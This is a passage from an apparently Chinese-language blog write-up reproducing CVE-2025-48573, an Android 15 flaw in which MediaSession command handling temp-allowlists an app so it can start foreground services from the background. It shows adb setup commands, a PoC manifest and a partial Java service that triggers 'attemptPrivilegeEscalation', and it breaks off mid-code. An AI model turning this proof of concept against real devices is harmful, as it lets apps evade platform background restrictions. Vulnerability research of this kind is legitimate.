└───────────┘                                           										 ▼<br>
┌───────────┐<br>
│  App B   				 │<br>
│ Victim   				 │<br>
│ MediaSession<br>
│ startForegroundService()<br>
└───────────┘</p>
<h2 id="二漏洞复现-2"><a class="anchor" href="#二漏洞复现-2">#</a> (二)漏洞复现</h2>
<h3 id="1环境-2"><a class="anchor" href="#1环境-2">#</a> 1.环境</h3>
<p>系统：Android15</p>
<p>安全更新：2025年5月5日</p>
<p>开启调试：</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-shell"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> root</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> remount</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> logcat</span><span style="color:#A65E2B;--shiki-dark:#C99076"> -c</span></span></code></pre>
<p>流程：</p>
<p>┌───────────┐        MediaController.sendCommand()<br>
│  App A    │ ────────────────────────────────▶ system_server<br>
│ Attacker  │                                           													 │<br>
│ (后台)    │                                        	  													  │ tempAllowlistTargetPkgIfPossible<br>
└───────────┘                                           										 ▼<br>
┌───────────┐<br>
│  App B   				 │<br>
│ Victim   				 │<br>
│ MediaSession<br>
│ startForegroundService()<br>
└───────────┘</p>
<h3 id="2poc"><a class="anchor" href="#2poc">#</a> 2.POC</h3>
<p>创建一个 Android 项目，包含以下核心组件：</p>
<ol>
<li><strong><code>VulnerableService</code></strong>：一个后台服务，持有 <code>MediaSession</code>，并尝试启动 FGS。</li>
<li><strong><code>MainActivity</code></strong>：用于初始化并触发 Exploit 流程，然后退到后台以模拟攻击场景。</li>
</ol>
<h4 id="a-androidmanifestxml"><a class="anchor" href="#a-androidmanifestxml">#</a> A. AndroidManifest.xml</h4>
<p>声明前台服务权限。</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-xml"><span class="line"><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#1E754F;--shiki-dark:#4D9375">manifest</span><span style="color:#B07D48;--shiki-dark:#BD976A"> xmlns</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">android</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">http://schemas.android.com/apk/res/android</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">    package</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">com.example.cve_2025_48573_poc</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#1E754F;--shiki-dark:#4D9375">uses-permission</span><span style="color:#B07D48;--shiki-dark:#BD976A"> android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">name</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">android.permission.FOREGROUND_SERVICE</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">/</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#1E754F;--shiki-dark:#4D9375">uses-permission</span><span style="color:#B07D48;--shiki-dark:#BD976A"> android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">name</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">android.permission.FOREGROUND_SERVICE_DATA_SYNC</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">/</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#1E754F;--shiki-dark:#4D9375">application</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">        android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">allowBackup</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">true</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">        android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">icon</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">@mipmap/ic_launcher</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">        android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">label</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">CVE-2025-48573 PoC</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">        android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">theme</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">@style/Theme.Cve_2025_48573_poc</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#1E754F;--shiki-dark:#4D9375">activity</span><span style="color:#B07D48;--shiki-dark:#BD976A"> android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">name</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">.MainActivity</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">            android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">exported</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">true</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">            </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#1E754F;--shiki-dark:#4D9375">intent-filter</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">                </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#1E754F;--shiki-dark:#4D9375">action</span><span style="color:#B07D48;--shiki-dark:#BD976A"> android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">name</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">android.intent.action.MAIN</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666"> /</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">                </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#1E754F;--shiki-dark:#4D9375">category</span><span style="color:#B07D48;--shiki-dark:#BD976A"> android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">name</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">android.intent.category.LAUNCHER</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666"> /</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">            </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#999999;--shiki-dark:#666666">/</span><span style="color:#1E754F;--shiki-dark:#4D9375">intent-filter</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#999999;--shiki-dark:#666666">/</span><span style="color:#1E754F;--shiki-dark:#4D9375">activity</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#1E754F;--shiki-dark:#4D9375">service</span><span style="color:#B07D48;--shiki-dark:#BD976A"> android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">name</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">.VulnerableService</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">            android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">exported</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">false</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666"> /</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#1E754F;--shiki-dark:#4D9375">service</span><span style="color:#B07D48;--shiki-dark:#BD976A"> android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">name</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">.ForegroundServiceTarget</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">            android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">foregroundServiceType</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">dataSync</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">            android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">exported</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">false</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">/</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#999999;--shiki-dark:#666666">/</span><span style="color:#1E754F;--shiki-dark:#4D9375">application</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#999999;--shiki-dark:#666666">/</span><span style="color:#1E754F;--shiki-dark:#4D9375">manifest</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span></code></pre>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/image-20260120215818991.png" alt="image-20260120215818991"></p>
<h4 id="b-vulnerableservicejava-攻击逻辑核心"><a class="anchor" href="#b-vulnerableservicejava-攻击逻辑核心">#</a> B. VulnerableService.java (攻击逻辑核心)</h4>
<p>这个服务负责建立 MediaSession 并执行自我攻击。创建新JAVA类：</p>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/image-20260120220001651.png" alt="image-20260120220001651"></p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-java"><span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">package</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> com</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">example</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">cve_2025_48573_poc</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">app</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Notification</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">app</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">NotificationChannel</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">app</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">NotificationManager</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">app</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Service</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">content</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Context</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">content</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Intent</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">media</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">session</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">MediaController</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">media</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">session</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">MediaSession</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">os</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Bundle</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">os</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Handler</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">os</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">IBinder</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">os</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Looper</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">util</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Log</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">public</span><span style="color:#AB5959;--shiki-dark:#CB7676"> class</span><span style="color:#2E8F82;--shiki-dark:#5DA994"> VulnerableService</span><span style="color:#AB5959;--shiki-dark:#CB7676"> extends</span><span style="color:#59873A;--shiki-dark:#80A665"> Service</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">{</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">    private</span><span style="color:#AB5959;--shiki-dark:#CB7676"> static</span><span style="color:#AB5959;--shiki-dark:#CB7676"> final</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> String</span><span style="color:#B07D48;--shiki-dark:#BD976A"> TAG</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">CVE-POC</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">    private</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> MediaSession</span><span style="color:#B07D48;--shiki-dark:#BD976A"> mSession</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    @</span><span style="color:#AB5959;--shiki-dark:#CB7676">Override</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">    public</span><span style="color:#AB5959;--shiki-dark:#CB7676"> void</span><span style="color:#59873A;--shiki-dark:#80A665"> onCreate</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span></span>
<span class="line"><span style="color:#A65E2B;--shiki-dark:#C99076">        super</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">onCreate</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">        Log</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">d</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">TAG</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">Service Created. Initializing MediaSession...</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">        initMediaSession</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">    private</span><span style="color:#AB5959;--shiki-dark:#CB7676"> void</span><span style="color:#59873A;--shiki-dark:#80A665"> initMediaSession</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">        // 1. 创建 MediaSession</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">        mSession </span><span style="color:#999999;--shiki-dark:#666666">=</span><span style="color:#1E754F;--shiki-dark:#4D9375"> new</span><span style="color:#59873A;--shiki-dark:#80A665"> MediaSession</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#A65E2B;--shiki-dark:#C99076">this</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">AttackerSession</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">        mSession</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">setActive</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#1E754F;--shiki-dark:#4D9375">true</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">        // 2. 设置回调（虽然利用不需要回调具体逻辑，但这是 Session 正常工作的必要步骤）</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">        mSession</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">setCallback</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#1E754F;--shiki-dark:#4D9375">new</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> MediaSession</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">Callback</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#a13865;--shiki-dark:#d9739f">{</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">            @</span><span style="color:#AB5959;--shiki-dark:#CB7676">Override</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">            public</span><span style="color:#AB5959;--shiki-dark:#CB7676"> void</span><span style="color:#59873A;--shiki-dark:#80A665"> onCommand</span><span style="color:#bda437;--shiki-dark:#e6cc77">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">String command</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> Bundle args</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#B07D48;--shiki-dark:#BD976A"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">os</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">ResultReceiver</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> cb</span><span style="color:#bda437;--shiki-dark:#e6cc77">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#bda437;--shiki-dark:#e6cc77">{</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">                Log</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">d</span><span style="color:#296aa3;--shiki-dark:#6394bf">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">TAG</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">Received command: </span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#AB5959;--shiki-dark:#CB7676"> +</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> command</span><span style="color:#296aa3;--shiki-dark:#6394bf">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">                // 收到命令时，说明系统已经执行了 sendCommand</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">                // 此时系统已经错误地给了我们 temp allowlist</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">                attemptPrivilegeEscalation</span><span style="color:#296aa3;--shiki-dark:#6394bf">(</span><span style="color:#296aa3;--shiki-dark:#6394bf">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">            </span><span style="color:#bda437;--shiki-dark:#e6cc77">}</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#a13865;--shiki-dark:#d9739f">}</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">        // 3. 延迟执行攻击，给 App 足够时间退到后台</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">        // 在实际复现中，你需要手动按 Home 键或通过代码将 App 移至后台</span></span>
